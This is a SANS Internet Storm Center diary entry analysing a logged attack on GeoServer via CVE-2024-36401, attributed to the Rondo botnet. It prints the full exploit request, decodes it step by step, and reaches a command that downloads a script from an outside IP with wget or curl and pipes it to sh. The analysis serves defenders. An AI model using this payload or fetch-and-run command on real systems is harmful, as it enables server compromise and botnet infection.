---
title: Rondo Meets Geoserver, (Wed, Jul 22nd)
url: https://isc.sans.edu/diary/rss/33176
source: SANS Internet Storm Center, InfoCON: green
date: 2026-07-22
fetch_date: 2026-07-23T05:11:38.932852
---

# Rondo Meets Geoserver, (Wed, Jul 22nd)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/33172)

Click [HERE](https://www.sans.org/profiles/dr-johannes-ullrich) to learn more about classes Johannes is teaching for SANS

# [Rondo Meets Geoserver](/forums/diary/Rondo%2BMeets%2BGeoserver/33176/)

**Published**: 2026-07-22. **Last Updated**: 2026-07-22 17:35:33 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[0 comment(s)](/diary/Rondo%2BMeets%2BGeoserver/33176/#comments)

This isn't a new attack, but something I saw "pop-up" in our logs this week:

> `GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),%27bash%20-c%20%7Becho%2CKHdnZXQgLXFPLSBodHRwOi8vNDUuMTUzLjM0LjE1My9yb25kby5gYHp5dC5zaHx8YnVzeWJveCB3Z2V0IC1xTy0gaHR0cDovLzQ1LjE1My4zNC4xNTMvcm9uZG8uYGB6eXQuc2h8fGN1cmwgLXMgaHR0cDovLzQ1LjE1My4zNC4xNTMvcm9uZG8uYGB6eXQuc2gpfHNo%7D%7C%7Bbase64%2C-d%7D%7Csh%27) HTTP/1.1
> Host: [redeacted]:8080
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
> Connection: close
> Accept: */*`

This attack is associated with CVE-2024-36401, an X-Path expression evaluation issue in Geoserver. Geoserver is a tool used to manage and manipulate data for geographic information systems ("maps").

URL decoding the URL leads to

> `/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'bash -c {echo,KHdnZXQgLXFPLSBodHRwOi8vNDUuMTUzLjM0LjE1My9yb25kby5gYHp5dC5zaHx8YnVzeWJveCB3Z2V0IC1xTy0gaHR0cDovLzQ1LjE1My4zNC4xNTMvcm9uZG8uYGB6eXQuc2h8fGN1cmwgLXMgaHR0cDovLzQ1LjE1My4zNC4xNTMvcm9uZG8uYGB6eXQuc2gpfHNo}|{base64,-d}|sh')`

And base64 decoding the string gets us:

> ``` (wget -qO- http://45.153.34.153/rondo.``zyt.sh||busybox wget -qO- http://45.153.34.153/rondo.``zyt.sh||curl -s http://45.153.34.153/rondo.``zyt.sh)|sh ```

So what we have is the "good old" Rondo botnet. It has been seen going after Geoserver before. Rondo is often playing little tricks with referense to rappers [1]. In this case, it looks like the botnet was kicked out form the host, and now returns:

> `<!-- You won't find it here -->
> <!DOCTYPE html>
> <html lang="en">
> <head>
>   <meta charset="UTF-8" />`

or maybe it is still there (see first line?), just not as visible? Makes me miss some of the defacement wars from the late 90s.

---
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)
[Twitter](https://jbu.me/164)|

Keywords: [rondo geo server](/tag.html?tag=rondo geo server)

[0 comment(s)](/diary/Rondo%2BMeets%2BGeoserver/33176/#comments)

Click [HERE](https://www.sans.org/profiles/dr-johannes-ullrich) to learn more about classes Johannes is teaching for SANS

* [previous](/diary/33172)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2026 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)